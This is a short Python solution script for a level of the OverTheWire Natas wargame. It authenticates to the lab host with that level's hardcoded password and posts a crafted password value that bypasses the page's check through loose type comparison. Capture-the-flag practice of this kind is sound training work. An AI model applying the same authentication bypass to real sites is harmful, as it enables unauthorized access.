import requests, re
u='natas23'
p='D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'
l=f'http://{u}.natas.labs.overthewire.org/'
resp=requests.post(l,auth=(u, p),data={'passwd':'100iloveyou'})
print(resp.text)
